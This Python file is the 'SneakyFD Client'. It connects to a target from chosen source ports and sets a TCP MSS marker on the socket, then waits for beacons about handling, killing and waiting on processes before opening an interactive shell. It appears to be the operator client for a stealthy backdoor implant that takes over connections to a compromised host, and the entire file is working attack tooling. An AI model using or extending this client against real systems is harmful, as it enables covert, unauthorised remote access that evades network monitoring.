from traitlets.config import Config
from IPython.terminal.embed import InteractiveShellEmbed
import socket
import random
from enum import Enum


class BeaconType(Enum):
    HELLO = 0x01
    HANDLE_PROCESS = 0x02
    KILL_PROCESS_FAILED = 0x03
    KILLED_PROCESS = 0x04
    WAIT_PROCESS = 0x05
    WAIT_PROCESS_DONE = 0x06
    WAIT_PROCESS_TIMEOUT = 0x07
    READY = 0xFF

    def __str__(self):
        return self.name


class TCPOptionsMarker:
    def __init__(self, mss):
        self.mss = mss

    def Set(self, sock):
        print(f"Setting socket MSS to {self.mss}")
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG, self.mss)

    def __str__(self):
        return f"TCPOptionsMarker(mss={self.mss})"


class Client:
    def __init__(self):
        self.host = str()
        self.dst_port = int()
        self.src_ports = list()
        self.markers = list()
        self.beacon_magic = b"\xDE\xAD\xBE\xEF"
        self.__sock = None

    def __str__(self):
        return (
            f"Client(\n"
            f"  host      = {self.host or '<not set>'}\n"
            f"  dst_port  = {self.dst_port or '<not set>'}\n"
            f"  src_ports = {self._format_list(self.src_ports)}\n"
            f"  markers   = {self._format_list(self.markers)}\n"
            f")"
        )

    def connect(self):
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        src_port = self.__random_src_port()
        self.__sock.bind(('', src_port))

        self.__mark_socket()

        print(
            f"Connecting to {self.host}:{self.dst_port} using source port {src_port}")
        self.__sock.connect((self.host, self.dst_port))
        print("Socket established")

        self.__wait_beacons()

    def shell(self):
        while True:
            user_input = input("Enter message to send: ")
            if "exit" == user_input:
                break
            self.__sock.sendall(user_input.encode())

            response = self.__sock.recv(1024)
            print("Received:", response.decode())

    def disconnect(self):
        self.__sock.close()

    def __wait_beacons(self):
        print("Waiting for beacons")
        recv_buffer = bytearray()
        while True:
            data = self.__sock.recv(4096)
            if not data:
                break

            recv_buffer.extend(data)
            real_data, beacons = self.__parse_beacons(recv_buffer)

            if real_data:
                print(f"Received data: {real_data}")

            for b in beacons:
                try:
                    print(f"Received beacon - {BeaconType(b)}")
                except ValueError:
                    print(f"Received beacon - {hex(b)} (unknown type)")
                if BeaconType.READY.value == b:
                    return

    def __parse_beacons(self, stream_data):
        beacons = []
        real_data = bytearray()
        i = 0

        while i < len(stream_data):
            if stream_data[i:i+len(self.beacon_magic)] == self.beacon_magic:
                # Found a beacon
                if i + len(self.beacon_magic) + 1 <= len(stream_data):
                    beacon_type = stream_data[i + len(self.beacon_magic)]
                    beacons.append(beacon_type)
                    # Skip beacon marker + type
                    i += len(self.beacon_magic) + 1
                else:
                    # Incomplete beacon marker (wait for more data)
                    break
            else:
                # This byte belongs to real content
                real_data.append(stream_data[i])
                i += 1

        # Trim processed bytes from the buffer
        del stream_data[:i]
        return bytes(real_data), beacons

    def __mark_socket(self):
        for m in self.markers:
            m.Set(self.__sock)

    def __random_src_port(self):
        total_ports = 0
        expanded = []
        for p in self.src_ports:
            if isinstance(p, tuple):
                start, end = p
                count = end - start + 1
                expanded.append(
                    ("range", start, end, total_ports, total_ports + count))
                total_ports += count
            else:
                expanded.append(("single", p, p, total_ports, total_ports + 1))
                total_ports += 1

        if total_ports == 0:
            raise ValueError("No ports available")

        # Pick a random index from total range
        idx = random.randint(0, total_ports - 1)

        # Map index to actual port
        for kind, start, end, lo, hi in expanded:
            if lo <= idx < hi:
                if kind == "single":
                    return start
                else:  # range
                    return start + (idx - lo)

    def __repr__(self):
        return self.__str__()

    @staticmethod
    def _format_list(lst):
        return ", ".join(map(str, lst)) if lst else "<empty>"


def start_shell():
    random.seed()

    client = Client()

    cfg = Config()
    cfg.InteractiveShellEmbed.colors = "Linux"  # Nice prompt color
    cfg.TerminalInteractiveShell.banner1 = "🥷 SneakyFD Client 🥷\n\nUse `client` object.\n"

    shell = InteractiveShellEmbed(config=cfg)
    shell(local_ns={"client": client})


if __name__ == "__main__":
    start_shell()
